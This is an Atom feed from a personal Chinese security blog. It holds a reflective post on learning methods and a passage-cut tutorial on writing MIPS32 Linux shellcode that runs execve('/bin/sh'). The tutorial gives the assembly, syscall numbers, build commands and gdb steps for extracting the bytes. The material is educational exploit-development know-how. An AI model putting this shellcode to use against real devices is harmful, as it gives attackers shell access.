<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>f1ower&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-22T10:18:50.144Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>f1ower</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Thinking_and_communication_about_how_I_go_to_study</title>
    <link href="http://yoursite.com/2019/12/22/Thinking-and-communication-about-how-I-go-to-study/"/>
    <id>http://yoursite.com/2019/12/22/Thinking-and-communication-about-how-I-go-to-study/</id>
    <published>2019-12-21T16:02:56.000Z</published>
    <updated>2019-12-22T10:18:50.144Z</updated>
    
    <content type="html"><![CDATA[<p>关于我如何去学习的思考与交流<br>这篇文章是一篇总结，有关我最近和某人的讨论和一些话题</p><h3 id="前情"><a href="#前情" class="headerlink" title="前情"></a>前情</h3><p>最近和某人讨论的话题是：<br>1.如何去学习一项技术（例如：逆向分析程序）<br>2.我想去考研（我认为考研可以带来思维宽度和技术深度的提升）</p><h3 id="考研"><a href="#考研" class="headerlink" title="考研"></a>考研</h3><p>某人告诉我他在一年前就摸清了考研这件事的风险和利弊，结论是：现在去考利益太小；<br>其实我挺想考研的，就像是前情里面提到的一样，其实这是我个人的想法；<br>他告诉我现在考研并不像我想象中那样，追求思维宽度和技术深度而去考研和学习；<br>为什么呢？为了一个光环和一个加成，更多的可能是：不知道还能干什么；<br>这里就比较微妙了，思维宽度和技术深度和研究生是没有什么必然关系；<br>如我这个想法而去考研的，可能只有1%（也有可能有3%），想搞科研是极少的；<br>可能考研的人里面有挺大一部分并不好学，如他推测那样只是应试而已，和中学并无变化；<br>他还告诉了我有关他大学的时候在图书馆里面的见闻，有很多人都在刷所谓的考研习题或者复习考试；<br>这里引出了有关我自己的一段想法和过去；</p><h3 id="儿时"><a href="#儿时" class="headerlink" title="儿时"></a>儿时</h3><p>我从小学开始到现在不喜欢上学的理由其实很简单：<br>我不想为了考试而去学习，如果每个人都一样，那我想做一个不一样人；<br>这里就提到了很多黑历史，就不在这篇文章中描述了；<br>但结果到现在还不错，也算初心不负了；<br>我没有向这个教育体制妥协，成为了一个异类；<br>我挺自豪的，因为我觉得我像个艺术家一样，突出了个性而非共性；</p><h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3><p>其实很多时候，考研所获得的个人能力收益是微乎甚微的，不会有决定性的作用；<br>光环效应，至少我和他到现在是不怎么相信的；<br>那么既然我幼小的考研梦想直接死于襁褓之中，那么我更多的需要思考的问题则变为：如何去学习</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>由于我觉得很有道理，所以这里引用他的一些原话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">怎么学习这一点，可以先不管</span><br><span class="line"></span><br><span class="line">首先，你必须总结出自己的方法</span><br><span class="line">你的问题是：东一下西一下</span><br><span class="line">任何事物入门都是好玩的，也是简单的，但深入可能变得枯燥和艰难，这个很正常</span><br><span class="line">前期是兴趣驱动，渐渐的则需要变成成果和自我感觉明显提升的正反馈</span><br><span class="line"></span><br><span class="line">而关于如何学习这一点</span><br><span class="line">需要从人是如何获得知识这个问题入手，即认识论，无非两点：</span><br><span class="line">1.从现象到本质</span><br><span class="line">2.从理论到实践</span><br><span class="line">前者偏向经验主义，后者则是当前科学研究的基本原则</span><br><span class="line">但需要注意的是：</span><br><span class="line">这里指的是研究，即如何获得新的知识，但我们的目的是学习</span><br><span class="line">学校并非发现知识，而是理解现有的知识</span><br></pre></td></tr></table></figure><p>我觉得他指出有关于我的问题真的很有道理，也是我目前在改正的一个点：<br>减少我的好奇心，将工作与生活中的兴趣集中于一件事上<br>其次，我其实在这段时间内感觉到了很多很多有关于我最近学习到的东西的反馈<br>但是有关于如何学习这一点，我才慢慢有点需要总结自己的方法的意识感觉</p><h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果有一段时间没有成果，也没有感觉自己提升，需要怎么办呢？</span><br><span class="line">不可能，你说的这种是遇到瓶颈了，遇到瓶颈怎么办，TK教主说的很清楚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//此段引用自TK教主</span><br><span class="line">从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题：</span><br><span class="line"> - 这个方向上最新进展是什么？都知道吗？</span><br><span class="line"> - 这个方向上最著名的专家有哪些？他们的研究都看过吗？</span><br><span class="line"> - 这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？</span><br><span class="line"> - 这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这些都做到了，那就就已经站在了研究的最前沿</span><br><span class="line">事实上，我们根本还没有上升到一个已经理解了所有现有知识的地步，需要去获取新的知识</span><br></pre></td></tr></table></figure><h3 id="前沿"><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h3><p>但其实只有站在最前沿，才能做到那样：从理论到实践<br>如果这样从根源上入手，了解其原因，这样不会产生困惑<br>从理论到实践，这其实就是理想中学校做的事：<br>经过系统化的理论知识训练，然后通过实验的方式深入理解<br>但除了最顶尖的高校，比如国外的斯坦福<br>（操作系统课是给每个学生一块板子和说明书，让他们写出可以运行在板子上的OS）<br>其他的学校其实很难做到如此教育资源的堆积<br>这里有一个矛盾：教育资源是很稀缺的，这就是中国高考竞争最本质的东西<br>但是如果没有这样理想的学校，想要通过自身来进行体系化的训练是十分困难的：<br>一是 难以从庞大的知识中找到正确的路径，精神和毅力层面的问题，不靠外力很难维持<br>二是 从自学的角度来讲，最好是根据现象到本质的思维，即以经验为主导，其中的关键就是确定要解决的问题</p><h3 id="坚持"><a href="#坚持" class="headerlink" title="坚持"></a>坚持</h3><p>有关于坚持的问题，某人其实也有很多聊的<br>能不能寄坚持这个问题，主要还是看个体，其实是无所谓的<br>从另一个纬度来看技术的话，不搞技术也没啥影响，也不能说不坚持，只是心态变了</p><h3 id="讲述"><a href="#讲述" class="headerlink" title="讲述"></a>讲述</h3><p>我学到的一件事：<br>在讲述一个方法的时候，要把为什么讲清楚，这样根基不会动摇<br>简单来说就是讲述一个对象的时候，将对象的相关背景也要弄明白，不能只给结论，这样才能让人信服</p><h3 id="习惯"><a href="#习惯" class="headerlink" title="习惯"></a>习惯</h3><p>还讨论来一些有关思想和习惯的问题<br>有一点需要注意，不要神化思想和方法论，指导我们生活的是习惯<br>即，知道再多，没有习惯性的运用，也是无用的 –休谟<br>自知是前进的动因</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有关考研：</span><br><span class="line">1.目前考研为我带来的收益远小于风险，放弃</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有关学习：</span><br><span class="line">1.前期兴趣驱动，我至少目前的阶段还有大量的兴趣来驱动我，渐渐变为成果和正反馈让自己更开心的继续学习</span><br><span class="line">2.将生活和工作中的好奇心与兴趣缩小，集中于一点或一个方向上</span><br><span class="line">3.从现在开始我需要做到通过自身来进行体系化的训练，尽管我可能不会成功或者需要大量时间来找到属于自己的方法</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有关坚持：</span><br><span class="line">1.不重要，懒的去想</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有关讲述：</span><br><span class="line">1.背景和历史的重要性我逐渐开始理解，我会在之后的学习和总结中加入对于一个对象背景的学习和思考，一个对象历史进程的了解和记录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有关习惯：</span><br><span class="line">1.尽量早点睡，保持我自己白天的精力充沛</span><br><span class="line">2.我会尝试着去规划时间，尝试多线程进行学习</span><br><span class="line">3.对于学习而来的知识进行运用，产生习惯</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;关于我如何去学习的思考与交流&lt;br&gt;这篇文章是一篇总结，有关我最近和某人的讨论和一些话题&lt;/p&gt;
&lt;h3 id=&quot;前情&quot;&gt;&lt;a href=&quot;#前情&quot; class=&quot;headerlink&quot; title=&quot;前情&quot;&gt;&lt;/a&gt;前情&lt;/h3&gt;&lt;p&gt;最近和某人讨论的话题是：&lt;br&gt;1.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>EZ2write_shellcode_with_ASM</title>
    <link href="http://yoursite.com/2019/11/19/EZ2write-shellcode-with-ASM/"/>
    <id>http://yoursite.com/2019/11/19/EZ2write-shellcode-with-ASM/</id>
    <published>2019-11-19T04:10:01.000Z</published>
    <updated>2019-11-19T06:34:57.678Z</updated>
    
    <content type="html"><![CDATA[<p>最近还是在看路由器这本书，里面有讲有关mips32下的Shellcode编写<br>我感觉这个编写思路适合几乎所有的Linux操作系统下的编写，所以也认真的分析和写，故此记录  </p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>我对于shellcode的理解是一段硬编码<br>在以前接触Windows的时候我在Visual Studio中编译好了简单的C程序之后会使用调试功能看汇编并提取其中的部分，然后新建一个测试程序并用指针指向该部分的硬编码去执行，我认为这很有趣<br>Linux也是如此，但是Linux的机制更加简单，方便直接进行系统调用  </p><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>在x86架构下的Linux中，几乎所有的syscall都是采用int 0x80这样的软中断来进行<br>然并卵，在mips架构下的Linux中又没有这样的软中断<br>但是mips架构下有syscall指令可以进行syscall，但是和x86下有一些区别在于不同的调用传参方式，不同的系统调用号等等…  </p><h3 id="how-2-syscall"><a href="#how-2-syscall" class="headerlink" title="how 2 syscall?"></a>how 2 syscall?</h3><p>我不太喜欢书中那种直接给结论的方式，所以我自己写一个来简单分析：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">        execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> mips-linux-gcc -static execve.c -o execve      </span><br><span class="line">execve.c: In function ‘main’:</span><br><span class="line">execve.c:5:2: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]</span><br><span class="line">  execve("/bin/sh", 0, 0);</span><br><span class="line">  ^~~~~~</span><br><span class="line"><span class="meta">$</span> qemu-mips execve   </span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p>IDA看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:00400370 .globl main</span><br><span class="line">.text:00400370 main:</span><br><span class="line">.text:00400370</span><br><span class="line">.text:00400370 var_10= -0x10</span><br><span class="line">.text:00400370 var_8= -8</span><br><span class="line">.text:00400370 var_4= -4</span><br><span class="line">.text:00400370</span><br><span class="line">.text:00400370 addiu   $sp, -0x20</span><br><span class="line">.text:00400374 sw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:00400378 sw      $fp, 0x20+var_8($sp)</span><br><span class="line">.text:0040037C move    $fp, $sp</span><br><span class="line">.text:00400380 li      $gp, 0x4271E0</span><br><span class="line">.text:00400388 sw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:0040038C move    $a2, $zero</span><br><span class="line">.text:00400390 move    $a1, $zero</span><br><span class="line">.text:00400394 lui     $v0, 0x41</span><br><span class="line">.text:00400398 addiu   $a0, $v0, (aBinSh - 0x410000)  # &quot;/bin/sh&quot;</span><br><span class="line">.text:0040039C la      $v0, execve</span><br><span class="line">.text:004003A0 move    $t9, $v0</span><br><span class="line">.text:004003A4 bal     execve</span><br><span class="line">.text:004003A8 nop</span><br></pre></td></tr></table></figure><p>$a0==指向”/bin/sh”的指针<br>$a1==0<br>$a2==0<br>跟进execve(“/bin/sh”,0,0);  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:004003D0                 .globl execve</span><br><span class="line">.text:004003D0 execve:                                  # CODE XREF: main+34↑p</span><br><span class="line">.text:004003D0                                          # DATA XREF: main+2C↑o ...</span><br><span class="line">.text:004003D0                 li      $gp, 0x26E10</span><br><span class="line">.text:004003D8                 addu    $gp, $t9</span><br><span class="line">.text:004003DC                 li      $v0, 0xFAB</span><br><span class="line">.text:004003E0                 syscall 0</span><br><span class="line">.text:004003E4                 beqz    $a3, locret_400404</span><br><span class="line">.text:004003E8                 nop</span><br><span class="line">.text:004003EC                 rdhwr   $v1, $29</span><br><span class="line">.text:004003F0                 move    $a0, $v1</span><br><span class="line">.text:004003F4                 la      $v1, 0xFFFF9000</span><br><span class="line">.text:004003F8                 addu    $v1, $a0</span><br><span class="line">.text:004003FC                 sw      $v0, 0($v1)</span><br><span class="line">.text:00400400                 li      $v0, 0xFFFFFFFF</span><br><span class="line">.text:00400404</span><br><span class="line">.text:00400404 locret_400404:                           # CODE XREF: execve+14↑j</span><br><span class="line">.text:00400404                 jr      $ra</span><br><span class="line">.text:00400408                 nop</span><br></pre></td></tr></table></figure><p>忽略对$gp全局指针的赋值，可以看到并没有修改$0-$2这三个参数，直接使用这三个参数<br>这个有个细节，在x86中的syscall是需要传递一个系统调用号的，这里也是一样  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li      $v0, 0xFAB</span><br></pre></td></tr></table></figure><p>这条指令将一个莫名奇妙的数字赋值给了$v0，而$v0一般是用于储存返回值的，用在这里挺奇怪的，其实这就调用的约定了<br>syscall指令之前，将系统调用号放到$v0中，系统调用的参数正常存放在$a0-$a3中…<br>伪c代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall($v0=syscall_number, $a0=args1, $a1=args2, ...);</span><br></pre></td></tr></table></figure><h3 id="syscall-number"><a href="#syscall-number" class="headerlink" title="syscall number"></a>syscall number</h3><p>和x86架构下不一样，mips构架也有自己的系统调用号<br>/include/asm/unistd.c  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_Linux      4000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_o32.h&gt;</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>/include/asm/unistd_o32.h  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_MIPS_UNISTD_O32_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_MIPS_UNISTD_O32_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syscall    (__NR_Linux + 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit       (__NR_Linux + 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork       (__NR_Linux + 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read       (__NR_Linux + 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write      (__NR_Linux + 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open       (__NR_Linux + 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_close      (__NR_Linux + 6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitpid    (__NR_Linux + 7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat      (__NR_Linux + 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link       (__NR_Linux + 9)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink     (__NR_Linux + 10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve     (__NR_Linux + 11)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir      (__NR_Linux + 12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time       (__NR_Linux + 13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod      (__NR_Linux + 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod      (__NR_Linux + 15)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown     (__NR_Linux + 16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_break      (__NR_Linux + 17)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unused18   (__NR_Linux + 18)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lseek      (__NR_Linux + 19)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid     (__NR_Linux + 20)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount      (__NR_Linux + 21)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount     (__NR_Linux + 22)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid     (__NR_Linux + 23)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid     (__NR_Linux + 24)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_stime      (__NR_Linux + 25)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace     (__NR_Linux + 26)</span></span><br><span class="line">···</span><br></pre></td></tr></table></figure><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>书中的例子为：<br>execve.S  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">        li      $a2,0x111;保证$a2&gt;0</span><br><span class="line">p:      bltzal  $a2,p;不会跳转，但是由于cpu流水线，会把addiu $sp,$sp,-32这条指令的地址放到$ra中</span><br><span class="line">        li      $a2,0;$a2==0</span><br><span class="line">        addiu   $sp,$sp,-32</span><br><span class="line">        addiu   $a0,$ra,28;$a0==sc的地址(依靠固定偏移算的)</span><br><span class="line">        sw      $a0,-24($sp)</span><br><span class="line">        sw      $zero,-20($sp)</span><br><span class="line">        addiu   $a1,$sp,-24;$a1=&#123;$a0的地址, 0&#125;</span><br><span class="line">        li      $v0,4011;系统调用号，execve为10进制的4011</span><br><span class="line">        syscall</span><br><span class="line">sc:</span><br><span class="line">        .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><p>因为很久没有看汇编了，所以比较生疏，mips的汇编也是非常有趣的，注释在代码中<br>这里分析之后推测C代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> </span><br><span class="line">main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span>* <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">char</span>* args[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">string</span>; = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    args[<span class="number">0</span>] = <span class="built_in">string</span>;</span><br><span class="line">    args[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    execve(<span class="built_in">string</span>, args, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> mips-linux-as execve.S -o s.o            </span><br><span class="line"><span class="meta">$</span> mips-linux-ld s.o -o execve</span><br><span class="line"><span class="meta">$</span> qemu-mips execve</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p>没有什么问题</p><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>我觉得书中的例子是execve(“/bin/sh”, {“/bin/sh”, 0}, 0);有点长<br>我整一个更短的来练手一下吧：<br>exe.S  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">        li      $a2,0x111</span><br><span class="line">p:      bltzal  $a2,p</span><br><span class="line">        li      $a2,0</span><br><span class="line">        addiu   $a0,$ra,0x10</span><br><span class="line">        li      $a1,0</span><br><span class="line">        li      $v0,4011</span><br><span class="line">        syscall</span><br><span class="line">sc:</span><br><span class="line">        .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> mips-linux-as exe.S -o exe.o </span><br><span class="line"><span class="meta">$</span> mips-linux-ld exe.o -o exe </span><br><span class="line"><span class="meta">$</span> qemu-mips exe   </span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p>去掉了对于$a1的赋值，事实证明还是可以直接执行   </p><h3 id="提取shellcode"><a href="#提取shellcode" class="headerlink" title="提取shellcode"></a>提取shellcode</h3><p>看一下代码段有多大：  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> readelf -S exe</span><br><span class="line">There are 8 section headers, starting at offset 0x2ac:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .MIPS.abiflags    MIPS_ABIFLAGS   00400098 000098 000018 18   A  0   0  8</span><br><span class="line">  [ 2] .reginfo          MIPS_REGINFO    004000b0 0000b0 000018 18   A  0   0  4</span><br><span class="line">  [ 3] .text             PROGBITS        004000d0 0000d0 000030 00  AX  0   0 16</span><br><span class="line">  [ 4] .gnu.attributes   GNU_ATTRIBUTES  00000000 000100 000010 00      0   0  1</span><br><span class="line">  [ 5] .symtab           SYMTAB          00000000 000110 000110 10      6  10  4</span><br><span class="line">  [ 6] .strtab           STRTAB          00000000 000220 000042 00      0   0  1</span><br><span class="line">  [ 7] .shstrtab         STRTAB          00000000 000262 000049 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure><p>两个Shell，一个Shell用qemu起一个gdb调试进程，另一边用gdb target remote远程调试  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble /r</span><br><span class="line">Dump of assembler code for function _ftext:</span><br><span class="line">=&gt; 0x004000d0 &lt;+0&gt;:24 06 01 11lia2,273</span><br></pre></td></tr></table></figure><p>由于符号的原因，gdb在disass的时候有点小问题  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble /r</span><br><span class="line">Dump of assembler code for function p:</span><br><span class="line">=&gt; 0x004000d4 &lt;+0&gt;:04 d0 ff ffbltzala2,0x4000d4 &lt;p&gt;</span><br><span class="line">   0x004000d8 &lt;+4&gt;:24 06 00 00lia2,0</span><br><span class="line">   0x004000dc &lt;+8&gt;:27 e4 00 10addiua0,ra,16</span><br><span class="line">   0x004000e0 &lt;+12&gt;:24 05 00 00lia1,0</span><br><span class="line">   0x004000e4 &lt;+16&gt;:24 02 0f abliv0,4011</span><br><span class="line">   0x004000e8 &lt;+20&gt;:00 00 00 0csyscall</span><br></pre></td></tr></table></figure><p>还有sc标号之后的数据：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /16xb sc</span><br><span class="line">0x4000ec 